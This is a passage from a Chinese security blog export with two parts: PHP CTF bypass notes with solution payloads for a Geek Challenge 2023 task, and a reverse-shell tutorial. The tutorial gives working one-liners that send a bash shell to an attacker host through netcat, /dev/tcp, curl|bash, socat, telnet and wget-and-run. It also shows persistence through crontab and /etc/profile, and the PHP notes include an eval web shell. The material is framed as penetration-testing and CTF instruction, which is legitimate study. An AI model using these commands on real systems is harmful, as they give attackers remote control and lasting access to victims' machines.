class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$xdmtql</span>))&#123;<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">jiuzhe</span>(<span class="hljs-variable">$xdmtql</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$xdmtql</span>,<span class="hljs-string">&#x27;sys nb&#x27;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;*******&#125;&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;true .swp file?&#x27;</span>;<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nijilenijile&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>pre_match</code>函数处理的字符长度有限，如果超过这个长度就会返回<code>false</code>也就是没有匹配到。利用利用下面的代码进行回溯，让<code>pre_match</code>函数报错，绕过该函数，这样<code>strpos</code>函数就可以顺利的匹配到我们的字符串从而输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>data = &#123;<span class="hljs-string">&quot;xdmtql&quot;</span>: <span class="hljs-string">&quot;sys nb&quot;</span> + <span class="hljs-string">&quot;aaaaa&quot;</span> * <span class="hljs-number">1000000</span>&#125;<br>res = requests.post(<span class="hljs-string">&#x27;http://4d3f6fc4-7a26-4ce2-b6b6-238a5f6c5f65.www.polarctf.com:8090/&#x27;</span>, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.content)<br></code></pre></td></tr></table></figure><p><code>$_GET[&#39;k_e_y&#39;] !==&#39;123&#39; &amp;&amp; preg_match(&#39;/^123$/&#39;,$GET[&#39;k_e_y&#39;])</code></p><p>可以使用%0a(换行符截断)来进行绕过完整</p><p>payload：get方法：<code>?k+e+y=123%0a</code></p><h3 id="PHP短标签"><a href="#PHP短标签" class="headerlink" title="PHP短标签"></a>PHP短标签</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span>可以用<span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br><br> <br><span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#前提是开启配置参数short_open_tags=on</span><br><span class="hljs-meta">&lt;?=</span>(表达式)<span class="hljs-meta">?&gt;</span>  等价于 <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> (表达式)<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#不需要开启参数设置</span><br>&lt;% <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;%&gt;   <span class="hljs-comment">#开启配置参数asp_tags=on，并且只能在7.0以下版本使用</span><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="hljs-comment">#不需要修改参数开关，但是只能在7.0以下可用。</span><br><br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="Geek-Challenge-2023"><a href="#Geek-Challenge-2023" class="headerlink" title="Geek Challenge 2023"></a>Geek Challenge 2023</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>])&amp;&amp;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>] !== <span class="hljs-string">&#x27;Welcome to GEEK 2023!&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>]) &lt; <span class="hljs-number">2023</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>] + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>]) &#123;<br>            <span class="hljs-variable">$array1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>];<br>            <span class="hljs-variable">$array2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array2</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>])&amp;&amp;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>]=<span class="hljs-string">&quot;Happy to see you!&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;再绕最后一步吧&quot;</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;好哩，快拿到flag啦&quot;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;这里绕不过去，QW可不答应了哈&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;嘿嘿嘿，你别急啊&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">?syc=Welcome to GEEK <span class="hljs-number">2023</span>!%0a&amp;lover=<span class="hljs-number">2</span>e4<br><br><span class="hljs-string">qw[]</span>=<span class="hljs-number">10932435112</span>&amp;yxx[]=aaroZmOk&amp;SYC[GEEK.<span class="hljs-number">2023</span>=Happy to see you!<br>其中<br><span class="hljs-string">qw[]</span>=0e07766915004133176347055865026311692244&amp;yxx[]=0e66507019969427134894567494305185566735<br><span class="hljs-string">qw[]</span>=<span class="hljs-number">10932435112</span>&amp;yxx[]=aaroZmOk<br>都可以<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF_PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反弹shell</title>
    <link href="/2023/10/28/%E5%8F%8D%E5%BC%B9shell/"/>
    <url>/2023/10/28/%E5%8F%8D%E5%BC%B9shell/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试实战中，我们经常会遇到Linux系统环境，而让Linux主机反弹个shell是再常见不过的事情了。</p><p>反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>那么为什么要用反弹shell呢？</p><p>反弹shell通常适用于如下几种情况：</p><ul><li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li><li>目标机端口被占用。</li><li>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</li><li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</li><li>……</li></ul><p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p><p>那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。</p><p>反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。</p><h2 id="利用netcat反弹shell"><a href="#利用netcat反弹shell" class="headerlink" title="利用netcat反弹shell"></a>利用netcat反弹shell</h2><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。 使用它你可以轻易的建立任何连接。</p><p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss">wget https:<span class="hljs-comment">//nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br>tar -xvzf netcat<span class="hljs-number">-0.7</span><span class="hljs-number">.1</span>.tar.gz<br>./configure<br><span class="hljs-built_in">make</span> &amp;&amp; <span class="hljs-built_in">make</span> install<br><span class="hljs-built_in">make</span> clean<br></code></pre></td></tr></table></figure><p>安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">netcat</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">netcat</span> <span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span> <span class="hljs-number">2333</span> -e /bin/bash<br><span class="hljs-comment"># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br></code></pre></td></tr></table></figure><h2 id="利用Bash反弹shell"><a href="#利用Bash反弹shell" class="headerlink" title="利用Bash反弹shell"></a>利用Bash反弹shell</h2><p>个人感觉反弹shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/47.xxx.xxx.72/</span><span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>或<br>bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span><br># bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/攻击机IP/</span>攻击机端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p>以下是针对Bash反弹一句话进行了拆分说明：</p><table><thead><tr><th>命令</th><th>命令详解</th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个bash交互环境。</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333</td><td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td></tr><tr><td>0&gt;&amp;1</td><td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td></tr></tbody></table><p>Bash反弹一句完整的解读过程就是：</p><p>Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p></blockquote><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Linux shell下有三种标准的文件描述符，分别如下：<br><span class="hljs-number">0</span> - stdin 代表标准输入,使用&lt;或&lt;&lt;<br><span class="hljs-number">1</span> - stdout 代表标准输出,使用&gt;或&gt;&gt;<br><span class="hljs-number">2</span> - stderr 代表标准错误输出,使用<span class="hljs-number">2</span>&gt;或<span class="hljs-number">2</span>&gt;&gt;<br><br>还有就是&gt;<span class="hljs-meta">&amp;这个符号的含义，最好的理解是这样的：</span><br>当&gt;<span class="hljs-meta">&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</span><br>当&gt;<span class="hljs-meta">&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</span><br><br>理解了上面这些知识，下面来解释一下这一条反弹shell的命令<br>bash -i代表在本地打开一个交互式bash，<br>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，<br>&gt;<span class="hljs-meta">&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，</span><br>如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在目标机输入命令，<br>输出以及错误输出的内容就会被传递显示到远程。<br></code></pre></td></tr></table></figure><h3 id="Curl配合Bash反弹shell"><a href="#Curl配合Bash反弹shell" class="headerlink" title="Curl配合Bash反弹shell"></a>Curl配合Bash反弹shell</h3><p>这里操作也很简单，借助了Linux中的管道。</p><p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>并开启2333端口的监听。</p><p>然后再目标机上执行如下，即可反弹shell：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> <span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>|bash<br></code></pre></td></tr></table></figure><p>根据curl命令和Linux管道的作用，你不难理解这其中的原理。</p><p>Curl配合Bash反弹shell的方式在CTF题目中经常出现，<code>curl IP|bash</code> 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p><h3 id="将反弹shell的命令写入定时任务"><a href="#将反弹shell的命令写入定时任务" class="headerlink" title="将反弹shell的命令写入定时任务"></a>将反弹shell的命令写入定时任务</h3><p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 中。(centos系列主机)</p><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 中。(Debian&#x2F;Ubuntu系列主机)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">*<span class="hljs-regexp">/1  *  *  *  *   /</span>bin<span class="hljs-regexp">/bash -i&gt;&amp;/</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-comment">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span><br></code></pre></td></tr></table></figure><h3 id="将反弹shell的命令写入-etc-profile文件"><a href="#将反弹shell的命令写入-etc-profile文件" class="headerlink" title="将反弹shell的命令写入&#x2F;etc&#x2F;profile文件"></a>将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</h3><p>将以下反弹shell的命写入&#x2F;etc&#x2F;profile文件中，&#x2F;etc&#x2F;profile中的内容会在用户打开bash窗口时执行。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/47.xxx.xxx.72/</span><span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br><span class="hljs-comment"># 最后面那个&amp;为的是防止管理员无法输入命令</span><br></code></pre></td></tr></table></figure><p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell：</p><h2 id="利用Socat反弹shell"><a href="#利用Socat反弹shell" class="headerlink" title="利用Socat反弹shell"></a>利用Socat反弹shell</h2><p>Socat是Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见这里：<a href="http://brieflyx.me/2015/linux-tools/socat-introduction/">http://brieflyx.me/2015/linux-tools/socat-introduction/</a></p><p>安装Socat的方法很简单：</p><ul><li>Ubuntu等可以直接使用 <code>apt-get install socat</code> 命令进行安装</li><li>也可以去官网下载源码包：<a href="http://www.dest-unreach.org/socat">http://www.dest-unreach.org/socat</a></li></ul><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">socat</span> TCP-LISTEN:<span class="hljs-number">2333</span> -<br>或<br>nc -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socat</span> tcp-connect:<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>:<span class="hljs-number">2333</span> exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane<br></code></pre></td></tr></table></figure><h2 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h2><p>当nc和&#x2F;dev&#x2F;tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mknod</span> a p; telnet <span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span> <span class="hljs-number">2333</span> <span class="hljs-number">0</span>&lt;a | /bin/bash <span class="hljs-number">1</span>&gt;a<br></code></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>攻击机需要开启两个本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">4000</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span> <span class="hljs-number">47.101.57.72</span> <span class="hljs-number">2333</span> | /bin/bash | telnet <span class="hljs-number">47.101.57.72</span> <span class="hljs-number">4000</span><br></code></pre></td></tr></table></figure><h2 id="wget方式反弹shell"><a href="#wget方式反弹shell" class="headerlink" title="wget方式反弹shell"></a>wget方式反弹shell</h2><p>利用wget进行下载执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget 192.168.20.130/shell.txt -O /tmp/x.php &amp;&amp; php /tmp/x.php<br></code></pre></td></tr></table></figure><p>利用下面贴出的php进行反弹。<br>开启监听</p><p><img src="/2023/10/28/%E5%8F%8D%E5%BC%B9shell/1698508151069.png" alt="1698508151069"></p><h2 id="curl-反弹-shell-原理"><a href="#curl-反弹-shell-原理" class="headerlink" title="curl 反弹 shell 原理"></a>curl 反弹 shell 原理</h2><p>在某<a href="https://twitter.com/joevennix/status/1258613994681544704">社交网站</a>上看到一句 curl 反弹 shell 命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123; curl -sNkT . https:<span class="hljs-regexp">//</span><span class="hljs-variable">$LHOST</span>:<span class="hljs-variable">$LPORT</span> &lt;<span class="hljs-regexp">/dev/</span>fd/<span class="hljs-number">3</span>| sh <span class="hljs-number">3</span>&gt;&amp;-;&#125; <span class="hljs-number">3</span>&gt;&amp;<span class="hljs-number">1</span>|:<br></code></pre></td></tr></table></figure><p>这句命令就像魔法一样神奇，和常见的反弹 shell 命令大相径庭。我花了些时间才理解它是如何工作的。</p><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><h4 id="冒号"><a href="#冒号" class="headerlink" title="冒号"></a>冒号</h4><p>命令的最后一个字符冒号是个鲜为人知的 Bash 内置命令，用 <code>man bash</code> 查看手册可以找到如下的说明：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">: <span class="hljs-comment">[参数]</span><br>    无效；除了扩展参数和执行任何指定的重定向外，该命令没有任何作用。返回的退出码为 0。<br></code></pre></td></tr></table></figure><h4 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h4><p>在 Bash 中，花括号有多种不同的用法，详情见《[浅析 Bash 中的 {花括号}]》。在我们尝试理解的魔法命令中用到了其中一种：可以在花括号中写多条命令，这些命令构成一个命令组，花括号后的重定向将对命令组中所有命令生效。</p><p>例如执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123; <span class="hljs-built_in">echo</span> 1 ; <span class="hljs-built_in">echo</span> 2 ; &#125; &gt; out.txt<br></code></pre></td></tr></table></figure><p>会发现屏幕没有任何输出，<code>out.txt</code> 的内容是：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1<br>2<br></code></pre></td></tr></table></figure><p>可见两条 <code>echo</code> 命令的标准输出都被重定向到了文件 <code>out.txt</code>。</p><p>需要注意的是，命令组中最后一条命令的后面也需要添加分号，以明确标识命令结束，否则 Bash 的语法解析器将无法正确解析。</p><p>另外，命令组的重定向优先级低于组内命令自身的重定向。例如执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123; <span class="hljs-built_in">echo</span> 1 &gt; inner.txt ; <span class="hljs-built_in">echo</span> 2 ; &#125; &gt; outer.txt<br></code></pre></td></tr></table></figure><p>会发现第一个 <code>echo</code> 命令的输出被重定向到了 <code>inner.txt</code>，而不是 <code>outer.txt</code>。</p><h4 id="dev-fd"><a href="#dev-fd" class="headerlink" title="&#x2F;dev&#x2F;fd&#x2F;"></a>&#x2F;dev&#x2F;fd&#x2F;</h4><p><code>/dev/fd/</code> 是指向 <code>/proc/self/fd</code> 的软链接。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -l /dev/fd<br>lrwxrwxrwx 1 root root 13 Jan 30 12:23 /dev/fd -&gt; /proc/self/fd<br></code></pre></td></tr></table></figure><p><code>/proc/self</code> 是一个特殊的软链接。当有进程查询该软链接的值时，Linux 内核会将 <code>/proc/self</code> 指向 <code>/proc/&lt;该进程的 PID&gt;</code>。</p><h4 id="curl-参数"><a href="#curl-参数" class="headerlink" title="curl 参数"></a>curl 参数</h4><p>使用 <code>man curl</code> 可以查询到魔法命令中 curl 各个参数的含义，整理后列举如下：</p><ul><li>-s, 